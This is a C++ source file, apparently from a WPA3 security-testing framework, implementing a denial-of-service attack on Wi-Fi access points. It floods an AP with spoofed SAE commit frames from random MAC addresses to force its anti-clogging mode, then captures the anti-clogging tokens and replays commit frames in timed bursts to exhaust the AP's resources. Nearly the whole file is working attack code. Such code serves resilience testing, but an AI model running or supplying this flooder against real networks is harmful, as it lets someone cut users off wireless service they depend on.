#include "attacks/DoS_hard/PMK_gobbler/pmk_gobbler.h"

#include <tins/tins.h>
#include <thread>
#include <chrono>
#include <stdexcept>

#include "ex_program/external_actors/ExternalConn.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::pmk_gobbler {

    // TODO use sae_params? (if not needed , maybe is more readable like thath)
    static RadioTap make_sae_commit(const HWAddress<6> &ap_mac,
                                    const HWAddress<6> &sta_mac,
                                    const vector<uint8_t> &token = {}) {
        Dot11Authentication auth;
        auth.addr1(ap_mac);
        auth.addr2(sta_mac);
        auth.addr3(ap_mac);
        auth.type(Dot11::MANAGEMENT);
        auth.subtype(Dot11::AUTH);
        auth.auth_algorithm(3); // SAE
        auth.auth_seq_number(1);
        auth.status_code(0);

        // group 19 (P-256) | optional ACM token | dummy scalar | dummy element
        vector<uint8_t> payload;
        payload.push_back(0x13);
        payload.push_back(0x00);
        payload.insert(payload.end(), token.begin(), token.end());
        payload.resize(payload.size() + 32 + 64, 0x00); // scalar + element

        auth.inner_pdu(RawPDU(payload));
        RadioTap rt;
        rt.inner_pdu(auth);
        return rt;
    }

    optional<ACMCookie> parse_acm_response(const RadioTap &pkt) {
        const auto *auth = pkt.find_pdu<Dot11Authentication>();
        if (!auth) return nullopt;

        if (auth->auth_algorithm()  != 3)  return nullopt; // SAE only
        if (auth->auth_seq_number() != 2)  return nullopt; // AP response
        if (auth->status_code()     != 76) return nullopt; // ANTI_CLOGGING_TOKEN_REQUIRED

        const auto *raw = auth->find_pdu<RawPDU>();
        if (!raw || raw->payload().size() < 3) return nullopt; // at least group(2) + 1 token byte

        ACMCookie entry;
        entry.sta_mac = auth->addr1(); // AP addresses the response to the STA
        // Skip group ID (2 bytes), rest is the token
        entry.token.assign(raw->payload().begin() + 2, raw->payload().end());
        return entry;
    }

    void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store) {
        SnifferConfiguration cfg;
        cfg.set_filter("wlan type mgt subtype auth and wlan addr2 "+ap_mac.to_string());
        cfg.set_promisc_mode(true);
        cfg.set_snap_len(2000);
        cfg.set_timeout(200);

        Sniffer sniffer(sniff_iface, cfg);
        log(LogLevel::INFO, "[pmk_gobbler] Cookie capture started on "+sniff_iface);

        sniffer.sniff_loop([&](PDU &pdu) -> bool {
            if (store.stop.load()) return false; // stop the loop

            const auto *rt = pdu.find_pdu<RadioTap>();
            if (!rt) return true;

            if (auto entry = parse_acm_response(*rt)) {
                {
                    lock_guard lock(store.mtx);
                    store.queue.push_back(std::move(*entry));
                }
                log(LogLevel::DEBUG, "[pmk_gobbler] Cookie captured for "
                    + entry->sta_mac.to_string()
                    + ", queue size: " + to_string([&] {
                        lock_guard l(store.mtx);
                        return store.queue.size();
                    }()));
            }
            return true;
        });

        log(LogLevel::INFO, "[pmk_gobbler] Cookie capture stopped");
    }

    ACMCookie trigger_acm(const string &iface, const string &sniff_iface,
                      const HWAddress<6> &ap_mac, const int max_frames) {
        PacketSender sender(iface);

        SnifferConfiguration cfg;
        cfg.set_filter("wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string());
        cfg.set_promisc_mode(true);
        cfg.set_snap_len(2000);
        cfg.set_timeout(50);
        Sniffer sniffer(sniff_iface, cfg);

        log(LogLevel::INFO, "[pmk_gobbler] Triggering ACM (max "+to_string(max_frames)+" frames)...");

        for (int i = 0; i < max_frames; ++i) {
            auto frame = make_sae_commit(ap_mac, HWAddress<6>(hw_capabilities::rand_mac()));
            sender.send(frame);

            // Check for any buffered AP responses after each send
            while (auto pkt = sniffer.next_packet()) {
                if (const auto *rt = pkt.pdu()->find_pdu<RadioTap>()) {
                    if (auto cookie = parse_acm_response(*rt)) {
                        log(LogLevel::INFO, "[pmk_gobbler] ACM confirmed active");
                        return std::move(*cookie);
                    }
                }
            }
            this_thread::sleep_for(microseconds(200));
        }
        throw runtime_error("[pmk_gobbler] ACM not activated after "+to_string(max_frames)+" frames");
    }

    void burst_with_cookies(const string &iface, const HWAddress<6> &ap_mac,
                            CookieStore &store, const int attack_time_sec) {
        PacketSender sender(iface);
        long long sent     = 0;
        long long next_log = 500;
        const auto end_time = steady_clock::now() + seconds(attack_time_sec);

        log(LogLevel::INFO, "[pmk_gobbler] Burst phase started, duration: "+to_string(attack_time_sec) +"s");

        while (steady_clock::now() < end_time) {
            ACMCookie entry;
            {
                lock_guard lock(store.mtx);
                if (store.queue.empty()) {
                    this_thread::sleep_for(milliseconds(10));
                    continue;
                }
                entry = std::move(store.queue.front());
                store.queue.pop_front();
            }

            auto frame = make_sae_commit(ap_mac, entry.sta_mac, entry.token);

            constexpr size_t BURST_SIZE = 64;
            for (size_t i = 0; i < BURST_SIZE; ++i) {
                sender.send(frame);
                this_thread::sleep_for(nanoseconds(100));
            }
            sent += BURST_SIZE;

            if (sent >= next_log) {
                size_t q_size;
                {
                    lock_guard l(store.mtx);
                    q_size = store.queue.size();
                }
                log(LogLevel::DEBUG, "[pmk_gobbler] Sent: " + to_string(sent)
                    + ", cookies remaining: " + to_string(q_size));
                next_log += 5000;
            }
        }

        store.stop.store(true); // signal capture thread to exit
        log(LogLevel::INFO, "[pmk_gobbler] Burst done. Total packets sent: " + to_string(sent));
    }

    void run_attack(RunStatus &rs) {
        const ActorPtr ap       = rs.get_actor("access_point");
        const ActorPtr attacker = rs.get_actor("attacker");

        const HWAddress<6> ap_mac(ap["mac"]);
        const string iface       = attacker["iface"];
        const string sniff_iface = attacker["sniff_iface"];

        const auto& att_cfg     = rs.config.at("attack_config");
        const int trigger_count = att_cfg.value("acm_trigger_count", 256);
        const int attack_time   = att_cfg.at("attack_time_sec").get<int>();

        //  force AP into ACM mode
        ACMCookie first = trigger_acm(iface, sniff_iface, ap_mac, trigger_count);
        this_thread::sleep_for(milliseconds(500)); // let AP activate ACM
        //TODO check
        rs.start_observers();

        CookieStore store;

        thread capture_thread([&]() {
            try {
                capture_cookies(sniff_iface, ap_mac, store);
            } catch (const exception &e) {
                log(LogLevel::ERROR, "[pmk_gobbler] Capture thread: " + string(e.what()));
                store.stop.store(true);
            }
        });

        try {
            burst_with_cookies(sniff_iface, ap_mac, store, attack_time);
        } catch (...) {
            store.stop.store(true);
            if (capture_thread.joinable()) capture_thread.join();
            throw;
        }

        if (capture_thread.joinable()) capture_thread.join();
        ap->conn->disconnect();
    }

    void stats_attack(const RunStatus &rs) {
        const auto ap = rs.config.at("actors").at("access_point");
        observer::resource_checker::create_graph(rs, ap["source"]);
    }

}